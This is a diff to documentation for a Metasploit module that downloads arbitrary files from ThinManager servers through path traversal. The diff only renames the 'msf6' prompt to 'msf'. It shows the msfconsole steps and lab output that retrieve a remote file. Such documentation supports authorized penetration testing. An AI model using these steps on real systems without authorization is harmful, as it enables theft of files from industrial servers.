@@ -26,10 +26,10 @@ The software can be obtained from
 2. Start `msfconsole` and run the following commands:
 
 ```
-msf6 > use auxiliary/gather/thinmanager_traversal_download 
-msf6 auxiliary(gather/thinmanager_traversal_download) > set RHOSTS <IP>
-msf6 auxiliary(gather/thinmanager_traversal_download) > set FILE <file to download>
-msf6 auxiliary(gather/thinmanager_traversal_download) > run
+msf > use auxiliary/gather/thinmanager_traversal_download 
+msf auxiliary(gather/thinmanager_traversal_download) > set RHOSTS <IP>
+msf auxiliary(gather/thinmanager_traversal_download) > set FILE <file to download>
+msf auxiliary(gather/thinmanager_traversal_download) > run
 ```
 
 This should retrieve the file as specified through FILE from the remote server.
@@ -44,7 +44,7 @@ The file to download from the remote server.
 Running the exploit against ThinManager v13.0.1 on Windows 22H2 should result in an output similar to the following:
 
 ```
-msf6 auxiliary(gather/thinmanager_traversal_download) > run
+msf auxiliary(gather/thinmanager_traversal_download) > run
 [*] Running module against 192.168.137.227
 
 [*] 192.168.137.227:2031 - Running automatic check ("set AutoCheck false" to disable)
@@ -56,7 +56,7 @@ msf6 auxiliary(gather/thinmanager_traversal_download) > run
 [*] 192.168.137.227:2031 - File saved as loot: /home/asdf/.msf4/loot/20250506150022_default_192.168.137.227_thinmanager.file_334213.txt
 [*] Auxiliary module execution completed
 
-msf6 auxiliary(gather/thinmanager_traversal_download) > cat /home/asdf/.msf4/loot/20250506150027_default_192.168.137.227_thinmanager.file_381967.txt
+msf auxiliary(gather/thinmanager_traversal_download) > cat /home/asdf/.msf4/loot/20250506150027_default_192.168.137.227_thinmanager.file_381967.txt
 [*] exec: cat /home/asdf/.msf4/loot/20250506150027_default_192.168.137.227_thinmanager.file_381967.txt
 
 ; for 16-bit app support
